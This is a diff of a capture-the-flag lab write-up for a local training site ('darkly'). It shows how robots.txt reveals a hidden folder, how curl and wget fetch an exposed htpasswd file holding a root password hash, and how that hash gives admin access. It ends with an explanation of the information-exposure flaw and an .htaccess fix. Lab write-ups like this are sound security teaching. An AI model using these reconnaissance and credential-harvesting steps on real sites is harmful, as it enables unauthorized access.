@@ -1,9 +1,10 @@
 # Admin(htpasswd)
 
-Go to <http://192.168.31.133/whatever/>
+If we go to <http://192.168.31.133/robots.txt> we will find 2 folders disallowed - `/whatever` and `/.hidden`.
+Let's check <http://192.168.31.133/whatever/>
 
 ```
-daniseed@DESKTOP-87RT6O2:~/darkly$  curl -v 192.168.31.133/whatever/
+daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.133/whatever/
 *   Trying 192.168.31.133:80...
 * TCP_NODELAY set
 * Connected to 192.168.31.133 (192.168.31.133) port 80 (#0)
@@ -56,7 +57,7 @@ root:437394baff5aa33daa618be47b75cb49
 OR
 
 ```
-daniseed@DESKTOP-87RT6O2:~/darkly$ wget http://192.168.31.133/whatever/htpasswd
+daniseed@DESKTOP:~/darkly$ wget http://192.168.31.133/whatever/htpasswd
 --2023-05-09 18:05:11--  http://192.168.31.133/whatever/htpasswd
 Connecting to 192.168.31.133:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -69,7 +70,7 @@ htpasswd                          100%[=========================================
 
 
 
-daniseed@DESKTOP-87RT6O2:~/darkly$ cat htpasswd
+daniseed@DESKTOP:~/darkly$ cat htpasswd
 root:437394baff5aa33daa618be47b75cb49
 ```
 
@@ -82,14 +83,19 @@ Input this on <http://192.168.31.133/admin/> and we have our flag
 
 ## Explanation
 
-Attack type: [Web Parameter Tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering): Hidden field manipulation
+Attack type: [Information exposure](https://cwe.mitre.org/data/definitions/200.html): robots.txt
 
-> When a web application uses hidden fields to store status information, a malicious user can tamper with the values stored on their browser and change the referred information.
+> The file robots.txt is used to give instructions to web robots, such as search engine crawlers, about locations within the web site that robots are allowed, or not allowed, to crawl and index. It is often used to identify restricted or private areas of a site's contents. The information in the file may therefore help an attacker to map out the site's contents, especially if some of the locations identified are not linked from elsewhere in the site. If the application relies on robots.txt to protect access to these areas, and does not enforce proper access control over them, then this presents a serious vulnerability. [more](https://portswigger.net/kb/issues/00600600_robots-txt-file)
 
-Once the adversary has determined which hidden fields are not being validated by the server, they will manipulate them to change the normal behavior of the web application in a way that benefits the adversary.
+So the robots.txt file is often used as a primary source of information about hidden areas of the web site.
 
 ## How to fix it
 
-> The attack success depends on integrity and logic validation mechanism errors.
+>  You should not assume that all web robots will honor the file's instructions. Rather, assume that attackers will pay close attention to any locations identified in the file. Do not rely on robots.txt to provide any kind of protection over unauthorized access.
 
-Validate sent data on server correctly.
+By adding this code to .htaccess file we can close robots.txt from indexing and following the hyperlink
+```
+<FilesMatch "robots.txt">
+	Header set X-Robots-Tag "noindex, nofollow"
+</FilesMatch>
+```
